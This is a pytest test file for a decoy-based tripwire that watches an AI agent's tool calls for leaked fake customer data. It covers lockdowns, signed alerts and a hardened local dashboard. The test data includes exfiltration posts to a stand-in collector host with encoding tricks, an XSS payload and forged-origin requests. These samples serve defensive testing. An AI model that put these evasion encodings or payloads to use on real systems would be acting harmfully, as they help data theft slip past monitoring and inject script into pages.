# Copyright 2026 AgentP-Codes
# SPDX-License-Identifier: AGPL-3.0-only
"""0.2: encoded decoys, watch mode, lockdown and clear, client names, webhook formats, the signed link with
Eurycleia, and the local page. Made-up data only."""

import base64
import json
import threading
import urllib.error
import urllib.request
from pathlib import Path

import pytest
from test_eumaeus import Shop, data

from eumaeus.alerts import Reporter, read_alerts
from eumaeus.cli import main
from eumaeus.decoys import Registry
from eumaeus.signals import Channel, link, sign
from eumaeus.tripwire import Tripwire


def session(tmp_path, kind="support", **kw):
    events = []
    channel = kw.pop("channel", Channel(tmp_path, "eumaeus"))
    tw = Tripwire(kind, "t", Registry(tmp_path), events.append, channel=channel, **kw)
    shop, n = Shop(), [0]

    def call(tool, **args):
        n[0] += 1
        what, out = tw.from_host({"jsonrpc": "2.0", "id": n[0], "method": "tools/call",
                                  "params": {"name": tool, "arguments": args}})
        if what == "reply":
            return out["result"]
        return tw.from_connector({"jsonrpc": "2.0", "id": n[0], "result": shop.call(tool, args)})["result"]
    return tw, shop, call, events


def decoy_customer(call):
    return next(c for c in data(call("list_customers")) if c["id"] not in {x["id"] for x in Shop.customers})


# ------------------------------------------------------------------ encoded and disguised decoys
@pytest.mark.parametrize("disguise", [
    lambda v: base64.b64encode(v.encode()).decode(),
    lambda v: base64.urlsafe_b64encode(v.encode()).decode().rstrip("="),
    lambda v: v.encode().hex(),
    lambda v: urllib.request.quote(urllib.request.quote(v, safe=""), safe=""),
    lambda v: "".join(f"&#{ord(c)};" for c in v),
    lambda v: " ".join(v),
    lambda v: v[::-1],
    lambda v: "".join(chr(ord(c) + 0xFEE0) if "!" <= c <= "~" else c for c in v),     # fullwidth
    lambda v: "​".join(v),                                                      # zero-width spaces
])
def test_a_decoy_sent_out_encoded_or_disguised_is_still_caught(tmp_path, disguise):
    tw, shop, call, events = session(tmp_path)
    decoy = decoy_customer(call)
    r = call("http_post", url="https://collector.example/in", body=f"data={disguise(decoy['email'])}")
    assert r["isError"] and events and events[0].kind == "sent_out" and shop.done == []


def test_encoding_a_real_value_raises_nothing(tmp_path):
    tw, shop, call, events = session(tmp_path)
    data(call("list_customers"))
    real = Shop.customers[0]["email"]
    for v in (base64.b64encode(real.encode()).decode(), real.encode().hex(), real[::-1], " ".join(real)):
        call("http_post", url="https://crm.example/sync", body=v)
    assert events == [] and len(shop.done) == 4


# ------------------------------------------------------------------ trip, lockdown, clear, watch
def test_using_a_decoy_locks_down_every_action_until_a_person_clears_it(tmp_path):
    tw, shop, call, events = session(tmp_path, client="Acme Dental")
    assert call("send_email", to=decoy_customer(call)["email"], subject="Hi", body="x")["isError"]
    r = call("create_refund", payment_intent="pi_3Pq1aB2cD3eF4g")                    # a real one, but locked
    assert r["isError"] and shop.done == []
    assert [e.kind for e in events] == ["used", "locked"] and all(e.client == "Acme Dental" for e in events)
    call("create_refund", payment_intent="pi_3Pq5hI6jK7lM8n")
    assert [e.level for e in events] == ["alert", "alert", "notice"]                  # one alert per lockdown
    assert "Acme Dental" in events[1].sentence()
    assert data(call("list_payments"))                                                # reading still works
    # a second session on the same computer is locked too
    _, shop2, call2, _ = session(tmp_path)
    assert call2("create_refund", payment_intent="pi_3Pq1aB2cD3eF4g")["isError"] and shop2.done == []
    assert main(["status", "--home", str(tmp_path)]) == 1
    assert main(["clear", "--home", str(tmp_path), "--reason", "looked: injected email"]) == 0
    assert main(["status", "--home", str(tmp_path)]) == 0
    call("create_refund", payment_intent="pi_3Pq1aB2cD3eF4g")
    call2("create_refund", payment_intent="pi_3Pq1aB2cD3eF4g")
    assert len(shop.done) == 1 and len(shop2.done) == 1


def test_no_lock_blocks_only_the_action_using_the_decoy(tmp_path):
    tw, shop, call, events = session(tmp_path, lock_on_trip=False)
    assert call("send_email", to=decoy_customer(call)["email"], subject="Hi", body="x")["isError"]
    call("create_refund", payment_intent="pi_3Pq1aB2cD3eF4g")
    assert len(shop.done) == 1 and Channel(tmp_path, "eumaeus").lockdown() is None


def test_watch_mode_alerts_but_never_blocks_or_locks(tmp_path):
    tw, shop, call, events = session(tmp_path, watch=True)
    decoy = decoy_customer(call)
    call("send_email", to=decoy["email"], subject="Hi", body="x")
    call("create_refund", payment_intent="pi_3Pq1aB2cD3eF4g")
    assert len(shop.done) == 2 and [e.kind for e in events] == ["used"] and not events[0].blocked
    assert events[0].level == "alert" and Channel(tmp_path, "eumaeus").lockdown() is None


# ------------------------------------------------------------------ signals
def test_a_forged_or_unsigned_signal_is_ignored(tmp_path):
    me, peer = tmp_path / "eumaeus", tmp_path / "eurycleia"
    link(me, peer, "eumaeus", "eurycleia")
    ch = Channel(me, "eumaeus")
    assert ch.linked and ch.lockdown() is None
    forged = [{"v": 1, "from": "eurycleia", "kind": "lockdown", "at": 9e9, "id": "x"},                 # no mac
              sign({"v": 1, "from": "eurycleia", "kind": "lockdown", "at": 9e9, "id": "y"}, b"k" * 32),  # wrong key
              {**sign({"v": 1, "from": "eurycleia", "kind": "clear", "at": 1.0, "id": "z"},
                      bytes.fromhex((me / "link.key").read_text())), "kind": "lockdown"}]               # altered
    (peer / "signals.jsonl").write_text("".join(json.dumps(s) + "\n" for s in forged) + "not json\n")
    assert Channel(me, "eumaeus").lockdown() is None and Channel(me, "eumaeus").signals() == []
    Channel(peer, "eurycleia").send("lockdown", detail="real")                         # signed with the key
    assert Channel(me, "eumaeus").lockdown()["detail"] == "real"
    Channel(me, "eumaeus").send("clear")
    assert Channel(peer, "eurycleia").lockdown() is None


def test_linking_again_discards_older_signals(tmp_path):
    me, peer = tmp_path / "a", tmp_path / "b"
    link(me, peer, "eumaeus", "eurycleia")
    Channel(me, "eumaeus").send("lockdown")
    link(me, peer, "eumaeus", "eurycleia")
    assert Channel(me, "eumaeus").lockdown() is None


def test_link_from_the_command_line(tmp_path, capsys):
    assert main(["link", "eurycleia", "--home", str(tmp_path / "e"), "--eurycleia-home", str(tmp_path / "c")]) == 0
    info = json.loads((tmp_path / "c" / "link.json").read_text())
    assert info["peer"] == "eumaeus" and Path(info["peer_home"]) == tmp_path / "e"
    assert (tmp_path / "e" / "link.key").read_text() == (tmp_path / "c" / "link.key").read_text()
    main(["status", "--home", str(tmp_path / "e")])
    assert "linked with Eurycleia: yes" in capsys.readouterr().out


# ------------------------------------------------------------------ alerts
@pytest.mark.parametrize("fmt", ["slack", "teams", "json"])
def test_webhook_formats(tmp_path, fmt):
    sent = []
    rep = Reporter(tmp_path, "https://hooks.example/x", quiet=True, post=lambda u, b: sent.append(b), fmt=fmt)
    tw, shop, call, events = session(tmp_path, client="Acme Dental", channel=None)
    tw.report = rep
    call("send_email", to=decoy_customer(call)["email"], subject="Hi", body="x")
    for _ in range(50):
        if sent:
            break
        threading.Event().wait(0.02)
    body = sent[0]
    text = json.dumps(body)
    assert "Acme Dental" in text
    if fmt == "slack":
        assert set(body) == {"text"}
    elif fmt == "teams":
        assert body["attachments"][0]["contentType"] == "application/vnd.microsoft.card.adaptive"
    else:
        assert body["source"] == "eumaeus" and body["client"] == "Acme Dental" and body["kind"] == "used"
    assert read_alerts(tmp_path)[0]["client"] == "Acme Dental"
    with pytest.raises(ValueError):
        Reporter(tmp_path, "https://hooks.example/x", fmt="xml")


# ------------------------------------------------------------------ the page
@pytest.fixture
def page(tmp_path):
    from eumaeus.ui import serve
    home, eh = tmp_path / "eumaeus", tmp_path / "eurycleia"
    link(home, eh, "eumaeus", "eurycleia")
    ready, held = threading.Event(), {}
    t = threading.Thread(target=serve, args=(home,), daemon=True,
                         kwargs={"open_browser": False, "ready": ready, "holder": held, "eurycleia_home": str(eh)})
    t.start()
    assert ready.wait(30)
    yield home, eh, held
    held["httpd"].shutdown()


def fetch(base, path, headers=None, method="GET", body=None):
    req = urllib.request.Request(base + path, headers=headers or {}, method=method, data=body)
    try:
        with urllib.request.build_opener(urllib.request.ProxyHandler({})).open(req, timeout=5) as r:  # local
            return r.status, r.read().decode(), r.headers
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(), e.headers


def test_the_page_needs_its_secret_and_refuses_other_sites(page):
    home, eh, held = page
    base, tok = held["url"].split("/?")[0], held["token"]
    assert held["url"].startswith("http://127.0.0.1:")
    assert fetch(base, "/")[0] == 403 and fetch(base, "/?t=wrong")[0] == 403
    status, html, headers = fetch(base, f"/?t={tok}")
    assert status == 200 and "script-src 'self'" in headers["Content-Security-Policy"]
    assert headers["X-Frame-Options"] == "DENY" and "<script>" not in html                 # no inline script
    assert fetch(base, "/api/state")[0] == 403
    assert fetch(base, "/api/state", {"X-Eumaeus": tok, "Host": "evil.example"})[0] == 403  # DNS rebinding
    Channel(home, "eumaeus").send("lockdown", detail="test")
    for headers in ({"Origin": "https://evil.example", "X-Eumaeus": tok}, {"Origin": base}):
        assert fetch(base, "/api/clear", headers, "POST", b"{}")[0] == 403
    assert Channel(home, "eumaeus").lockdown() is not None
    status, out, _ = fetch(base, "/api/clear", {"Origin": base, "X-Eumaeus": tok}, "POST", b"{}")
    assert status == 200 and json.loads(out)["cleared"] and Channel(eh, "eurycleia").lockdown() is None


def test_the_page_shows_both_products_as_text(page):
    home, eh, held = page
    base, tok = held["url"].split("/?")[0], held["token"]
    nasty = "<img src=x onerror=alert(1)>\x1b[2J"
    Channel(eh, "eurycleia").send("lockdown", detail=nasty)
    (eh / "audit.jsonl").write_text(json.dumps({"ts": 1764000000.5, "event": "act", "decision": "block",
                                                "sink": "send_email", "reason": "outside domain"}) + "\n"
                                    + "not json\n")
    (eh / "tool-pins").mkdir()
    (eh / "tool-pins" / "srv-0123456789ab.json").write_text(json.dumps(
        {"server": "srv-0123456789ab", "label": "stripe", "approved": {"refund": {"a": 1}, "old": {}},
         "seen": {"tools": {"refund": {"a": 2}, "export_all": {}}}}))
    s = json.loads(fetch(base, "/api/state", {"X-Eumaeus": tok})[1])
    assert s["linked"] and s["lockdown"]["from"] == "eurycleia" and "\x1b" not in s["lockdown"]["detail"]
    assert s["held"] == [{"server": "srv-0123456789ab", "label": "stripe", "changed": ["export_all", "refund"],
                          "removed": ["old"]}]
    whats = [e["what"] for e in s["events"]]
    assert any("blocked send_email: outside domain" in w for w in whats) and any("LOCKDOWN" in w for w in whats)
    js = fetch(base, "/app.js")[1]
    assert "innerHTML" not in js and "textContent" in js


def test_the_signature_matches_eurycleia():
    """The same test vector is in Eurycleia's tests: change one, change both."""
    s = sign({"v": 1, "from": "eumaeus", "kind": "lockdown", "at": 1764000000.5, "id": "00ff",
              "detail": "José used a decoy"}, bytes(range(32)))
    assert s["mac"] == "215d72ec42c8d2f43fc89657948ea72e0c5ae514513e71759e5ef33c3df54560"


def test_a_clear_at_the_same_moment_as_a_lockdown_wins(tmp_path):
    me, peer = tmp_path / "a", tmp_path / "b"
    link(me, peer, "eumaeus", "eurycleia")
    key = bytes.fromhex((me / "link.key").read_text())
    (me / "signals.jsonl").write_text(json.dumps(sign({"v": 1, "from": "eumaeus", "kind": "lockdown", "at": 5.0,
                                                       "id": "a"}, key)) + "\n")
    (peer / "signals.jsonl").write_text(json.dumps(sign({"v": 1, "from": "eurycleia", "kind": "clear", "at": 5.0,
                                                         "id": "b"}, key)) + "\n")
    assert Channel(me, "eumaeus").lockdown() is None


# ------------------------------------------------------------------ a decoy sent back to its owner
class Account:
    """One customer's record with their own payments in it, as a CRM lookup returns it."""

    record = {"id": "C012", "name": "Priya Shah", "email": "priya.shah@example.com",
              "payments": [{"id": "pi_3Pq1aB2cD3eF4g", "amount": 4900, "status": "succeeded"},
                           {"id": "pi_3Pq5hI6jK7lM8n", "amount": 2500, "status": "succeeded"}]}


def account_session(tmp_path):
    events, n = [], [0]
    tw = Tripwire("support", "t", Registry(tmp_path), events.append)

    def call(tool, result=None, **args):
        n[0] += 1
        what, out = tw.from_host({"jsonrpc": "2.0", "id": n[0], "method": "tools/call",
                                  "params": {"name": tool, "arguments": args}})
        if what == "reply":
            return out["result"]
        back = tw.from_connector({"jsonrpc": "2.0", "id": n[0], "result": {
            "content": [{"type": "text", "text": json.dumps(result if result is not None else {"ok": True})}]}})
        return back["result"]
    rec = json.loads(call("get_customer", Account.record, id="C012")["content"][0]["text"])
    history = "\n".join(f"{p['id']} {p['amount']}" for p in rec["payments"])
    assert len(rec["payments"]) == 3
    return call, events, history


def test_a_customer_sent_their_own_payments_is_a_notice_not_an_alarm(tmp_path):
    call, events, history = account_session(tmp_path)
    r = call("send_email", to="priya.shah@example.com", subject="Your payments", body=history)
    assert not r.get("isError") and [(e.kind, e.level) for e in events] == [("told_owner", "notice")]


@pytest.mark.parametrize("to,cc", [("records@outside.example", None), ("priya.shah@example.com",
                                                                       "records@outside.example")])
def test_the_same_list_sent_to_anyone_else_is_caught(tmp_path, to, cc):
    call, events, history = account_session(tmp_path)
    args = {"to": to, "subject": "payments", "body": history, **({"cc": cc} if cc else {})}
    assert call("send_email", **args)["isError"]
    assert [(e.kind, e.level) for e in events] == [("sent_out", "alert")]


def test_a_list_of_customers_sent_to_one_of_them_is_still_caught(tmp_path):
    tw, shop, call, events = session(tmp_path, channel=None)
    dump = "\n".join(f"{c['name']} {c['email']}" for c in data(call("list_customers")))
    assert call("send_email", to=Shop.customers[0]["email"], subject="list", body=dump)["isError"]
    assert events[0].kind == "sent_out"


def test_refunding_a_decoy_payment_of_ones_own_is_still_caught(tmp_path):
    call, events, history = account_session(tmp_path)
    real = {p["id"] for p in Account.record["payments"]}
    decoy = next(line.split()[0] for line in history.splitlines() if line.split()[0] not in real)
    assert call("create_refund", payment_intent=decoy)["isError"]
    assert [(e.kind, e.level) for e in events] == [("used", "alert")]
